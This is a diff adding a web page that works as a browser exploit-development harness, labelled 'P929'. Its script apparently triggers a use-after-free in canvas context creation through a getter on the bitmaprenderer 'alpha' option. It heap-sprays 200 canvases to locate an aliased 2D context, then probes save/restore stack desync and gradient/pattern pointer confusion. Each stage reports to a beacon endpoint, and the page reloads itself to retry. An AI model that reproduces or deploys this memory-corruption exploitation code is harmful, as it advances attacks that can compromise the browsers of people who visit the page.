@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P929: StateStack Desync & CanvasStyle Pointer Overlap Mapper</title>
+<style>
+:root {
+  --bg: #090d16;
+  --card: #111827;
+  --border: #1f2937;
+  --text: #e5e7eb;
+  --dim: #9ca3af;
+  --cyan: #06b6d4;
+  --green: #10b981;
+  --amber: #f59e0b;
+  --red: #ef4444;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  padding: 16px;
+  line-height: 1.5;
+}
+.header {
+  border: 1px solid var(--border);
+  background: var(--card);
+  padding: 14px 18px;
+  border-radius: 6px;
+  margin-bottom: 14px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.title {
+  color: var(--cyan);
+  font-weight: 700;
+  font-size: 15px;
+  letter-spacing: 0.5px;
+}
+.badge {
+  background: var(--cyan);
+  color: #040810;
+  font-weight: 700;
+  padding: 3px 8px;
+  border-radius: 3px;
+  font-size: 11px;
+}
+.grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+}
+.card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 12px;
+}
+.card-title {
+  font-size: 12px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--dim);
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 6px;
+  margin-bottom: 8px;
+  display: flex;
+  justify-content: space-between;
+}
+.stat {
+  display: flex;
+  justify-content: space-between;
+  margin: 5px 0;
+  font-size: 12px;
+}
+.stat-val { font-weight: 700; font-family: monospace; }
+.ok { color: var(--green); }
+.warn { color: var(--amber); }
+.alert { color: var(--red); }
+pre#log {
+  background: #04060a;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 10px;
+  font-size: 11px;
+  color: #a7f3d0;
+  max-height: 380px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="title">&#9889; P929: STATE-STACK &amp; CANVAS-STYLE POINTER OVERLAP MAPPER</div>
+  <div class="badge" id="statusBadge">INITIALIZING...</div>
+</div>
+
+<div class="grid">
+  <div class="card">
+    <div class="card-title">
+      <span>TEST METRICS</span>
+      <span id="testState" class="warn">RUNNING</span>
+    </div>
+    <div class="stat"><span>Canvas Alias Index:</span><span id="mAlias" class="stat-val warn">Finding...</span></div>
+    <div class="stat"><span>StateStack Depths Tested:</span><span id="mStackDepth" class="stat-val">0 / 64 levels</span></div>
+    <div class="stat"><span>Save/Restore Desync Hits:</span><span id="mStackHits" class="stat-val ok">0</span></div>
+    <div class="stat"><span>Style Variant Transitions:</span><span id="mStyleTests" class="stat-val">0 / 6 tests</span></div>
+    <div class="stat"><span>Style Pointer Confusion Hits:</span><span id="mStyleHits" class="stat-val ok">0</span></div>
+    <div class="stat"><span>Total State Overlaps:</span><span id="mTotalHits" class="stat-val ok">0</span></div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">
+      <span>DIAGNOSTIC LOG</span>
+      <span class="ok">TAG: P929</span>
+    </div>
+    <pre id="log">[*] P929 StateStack &amp; CanvasStyle Mapper Loaded.</pre>
+  </div>
+</div>
+
+<script>
+'use strict';
+var logEl = document.getElementById('log');
+var statusBadge = document.getElementById('statusBadge');
+var testState = document.getElementById('testState');
+var mAlias = document.getElementById('mAlias');
+var mStackDepth = document.getElementById('mStackDepth');
+var mStackHits = document.getElementById('mStackHits');
+var mStyleTests = document.getElementById('mStyleTests');
+var mStyleHits = document.getElementById('mStyleHits');
+var mTotalHits = document.getElementById('mTotalHits');
+
+function log(msg) {
+  var d = document.createElement('div');
+  d.textContent = msg;
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P929-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+window.onerror = function(msg, url, line) {
+  syncBn('ERR', msg + ' @ line ' + line);
+  log('[!] ERROR: ' + msg + ' (Line ' + line + ')');
+};
+
+log('[*] P929: Initializing StateStack & CanvasStyle investigation.');
+syncBn('BOOT', 'start');
+
+/* ============================================================
+ * STEP 1: Create Canvas UAF Alias (Handle A and Handle B)
+ * ============================================================ */
+var handleA = null;
+var handleB = null;
+var aliasIdx = -1;
+var sprayCanvases = [], sprayCtxs = [];
+
+try {
+  var c1 = document.createElement('canvas');
+  c1.width = 32; c1.height = 32;
+  var opts1 = {};
+  Object.defineProperty(opts1, 'alpha', {
+    get: function() { handleA = c1.getContext('2d'); return true; }
+  });
+  c1.getContext('bitmaprenderer', opts1);
+
+  for (var s = 0; s < 200; s++) {
+    var c = document.createElement('canvas');
+    c.width = 32; c.height = 32;
+    var ctx = c.getContext('2d');
+    ctx.lineWidth = 1000.0 + s;
+    sprayCanvases.push(c);
+    sprayCtxs.push(ctx);
+  }
+
+  var lw = handleA ? handleA.lineWidth : -1;
+  if (lw >= 1000.0 && lw < 1200.0) {
+    aliasIdx = Math.round(lw - 1000.0);
+    handleB = sprayCtxs[aliasIdx];
+  }
+
+  if (aliasIdx >= 0 && handleB) {
+    mAlias.textContent = '#' + aliasIdx;
+    mAlias.className = 'stat-val ok';
+    log('[+] Canvas UAF Alias acquired at spray index #' + aliasIdx);
+    syncBn('ALIAS-OK', 'idx=' + aliasIdx);
+  } else {
+    mAlias.textContent = 'FAILED';
+    mAlias.className = 'stat-val alert';
+    log('[-] Failed to acquire canvas alias.');
+    syncBn('ALIAS-FAIL', 'lw=' + lw);
+    setTimeout(function() { location.reload(); }, 500);
+  }
+} catch(e) {
+  log('[-] Setup exception: ' + e.message);
+  syncBn('SETUP-ERR', e.message);
+}
+
+if (handleA && handleB) {
+  setTimeout(runP929Tests, 100);
+}
+
+function runP929Tests() {
+  var stackHits = 0;
+  var styleHits = 0;
+
+  /* ============================================================
+   * TEST 1: StateStack Out-of-Line Reallocation & Desync
+   * We push up to 64 save frames to force Vector<State, 1>
+   * to allocate an out-of-line FastMalloc buffer.
+   * ============================================================ */
+  log('[*] TEST 1: StateStack Reallocation & Desync testing (1 to 64 frames)...');
+  var depths = [2, 4, 8, 16, 32, 64];
+
+  for (var d = 0; d < depths.length; d++) {
+    var targetDepth = depths[d];
+    try {
+      // 1. Push targetDepth frames through Handle A, mutating state at each depth to realize the save
+      for (var s = 0; s < targetDepth; s++) {
+        handleA.save();
+        handleA.lineWidth = 10000 + s;
+      }
+
+      // 2. Read back through Handle B: does Handle B see the deepest state?
+      var bLW = handleB.lineWidth;
+      var expectedDeepLW = 10000 + (targetDepth - 1);
+      var bMatch = (Math.abs(bLW - expectedDeepLW) < 0.001);
+
+      // 3. Mutate through Handle B at the peak of the stack
+      handleB.lineWidth = 99999.0;
+      var aReadPeak = handleA.lineWidth;
+
+      // 4. Pop half the frames through Handle B
+      var half = Math.floor(targetDepth / 2);
+      for (var r = 0; r < half; r++) {
+        handleB.restore();
+      }
+
+      // Read state on Handle A
+      var aPostRestore = handleA.lineWidth;
+      var expectedHalfLW = 10000 + (targetDepth - 1 - half);
+
+      // 5. Unwind remaining frames through Handle A
+      for (var r = 0; r < (targetDepth - half); r++) {
+        handleA.restore();
+      }
+
+      var aBaseline = handleA.lineWidth;
+
+      // Check for stack anomaly or underflow
+      if (!bMatch || Math.abs(aPostRestore - expectedHalfLW) > 0.001) {
+        stackHits++;
+        log('[!] STATE-STACK DESYNC at depth ' + targetDepth + ': bMatch=' + bMatch + 
+            ', aPostRestore=' + aPostRestore + ' (exp ' + expectedHalfLW + ')');
+        syncBn('STACK-DESYNC', 'depth=' + targetDepth + '|got=' + aPostRestore + '|exp=' + expectedHalfLW);
+      } else {
+        log('    Depth ' + targetDepth + ': Clean unwind (peak=' + bLW + ', mid=' + aPostRestore + ', base=' + aBaseline + ')');
+      }
+    } catch(e) {
+      log('[-] Stack depth ' + targetDepth + ' exception: ' + e.message);
+      syncBn('STACK-ERR', 'depth=' + targetDepth + '|msg=' + e.message);
+    }
+
+    mStackDepth.textContent = (d + 1) + ' / ' + depths.length + ' depths';
+    mStackHits.textContent = stackHits;
+    if (stackHits > 0) mStackHits.className = 'stat-val alert';
+  }
+
+  /* ============================================================
+   * TEST 2: CanvasStyle C++ Pointer Transition (Color <-> Gradient)
+   * CanvasStyle stores a 16-byte union: RGBA or RefPtr<CanvasGradient>
+   * ============================================================ */
+  log('[*] TEST 2: CanvasStyle C++ Pointer Transition (Color <-> Gradient <-> Pattern)...');
+  var styleTests = 0;
+
+  try {
+    // Sub-test 1: Create LinearGradient on Handle A
+    styleTests++;
+    var grad = handleA.createLinearGradient(0, 0, 100, 100);
+    grad.addColorStop(0, '#ff0000');
+    grad.addColorStop(1, '#0000ff');
+    handleA.fillStyle = grad;
+
+    // Read back through Handle B
+    var bGrad = handleB.fillStyle;
+    var gradSame = (bGrad === grad);
+    log('    Sub-test 1 (Gradient identity): same=' + gradSame + ', typeof=' + (typeof bGrad));
+
+    // Sub-test 2: Overwrite gradient with float RGBA string through Handle B
+    styleTests++;
+    handleB.fillStyle = 'rgba(128, 64, 32, 0.5)';
+    var aColor = handleA.fillStyle;
+    log('    Sub-test 2 (Color overwrite of Gradient): Handle A reads ' + aColor);
+
+    // Sub-test 3: Create Pattern on Handle B
+    styleTests++;
+    var patCanvas = document.createElement('canvas');
+    patCanvas.width = 4; patCanvas.height = 4;
+    var patCtx = patCanvas.getContext('2d');
+    patCtx.fillStyle = '#00ff00';
+    patCtx.fillRect(0, 0, 4, 4);
+    var pat = handleB.createPattern(patCanvas, 'repeat');
+    handleB.fillStyle = pat;
+
+    var aPat = handleA.fillStyle;
+    var patSame = (aPat === pat);
+    log('    Sub-test 3 (Pattern identity): same=' + patSame + ', typeof=' + (typeof aPat));
+
+    // Sub-test 4: Asymmetric push with gradient, restore to color
+    styleTests++;
+    handleA.fillStyle = '#112233';
+    handleA.save();
+    handleA.fillStyle = grad;
+    handleB.restore();
+    var postRestoreStyle = handleB.fillStyle;
+    var styleReverted = (postRestoreStyle === '#112233');
+    log('    Sub-test 4 (Asymmetric Style Restore): styleReverted=' + styleReverted + ' (' + postRestoreStyle + ')');
+
+    // Sub-test 5: Stash Gradient reference, set lineDash to 96 elements, check gradient validity
+    styleTests++;
+    handleA.fillStyle = grad;
+    var hugeDash = [];
+    for (var k = 0; k < 96; k++) hugeDash.push(k * 2.5);
+    handleB.setLineDash(hugeDash);
+    var gradAfterDash = handleA.fillStyle;
+    var gradSurvives = (gradAfterDash === grad);
+    log('    Sub-test 5 (Gradient after 96-double dash alloc): survives=' + gradSurvives);
+
+    if (!gradSurvives || !styleReverted) {
+      styleHits++;
+      log('[!] STYLE POINTER ANOMALY DETECTED!');
+      syncBn('STYLE-ANOMALY', 'survives=' + gradSurvives + '|reverted=' + styleReverted);
+    }
+
+    // Reset clean
+    handleA.fillStyle = '#000000';
+    handleB.setLineDash([]);
+  } catch(e) {
+    log('[-] Style test exception: ' + e.message);
+    syncBn('STYLE-ERR', e.message);
+  }
+
+  mStyleTests.textContent = styleTests + ' tests';
+  mStyleHits.textContent = styleHits;
+  if (styleHits > 0) mStyleHits.className = 'stat-val alert';
+
+  /* ============================================================
+   * SUMMARY & COMPLETION
+   * ============================================================ */
+  var totalHits = stackHits + styleHits;
+  mTotalHits.textContent = totalHits;
+
+  if (totalHits > 0) {
+    mTotalHits.className = 'stat-val alert';
+    testState.textContent = 'ANOMALY DETECTED';
+    testState.className = 'alert';
+    statusBadge.textContent = 'P929: ANOMALIES FOUND (' + totalHits + ')';
+    statusBadge.style.background = '#ef4444';
+    log('[***] P929 COMPLETE: ' + totalHits + ' anomalies identified.');
+  } else {
+    mTotalHits.className = 'stat-val ok';
+    testState.textContent = 'COMPLETE (INVARIANT PRESERVED)';
+    testState.className = 'ok';
+    statusBadge.textContent = 'P929 COMPLETE (0 ANOMALIES)';
+    statusBadge.style.background = '#10b981';
+    log('[***] P929 COMPLETE: StateStack and CanvasStyle maintain strict C++ object invariants.');
+  }
+
+  syncBn('DONE', 'stackHits=' + stackHits + '|styleHits=' + styleHits + '|totalHits=' + totalHits + '|aliasIdx=' + aliasIdx);
+}
+</script>
+</body>
+</html>
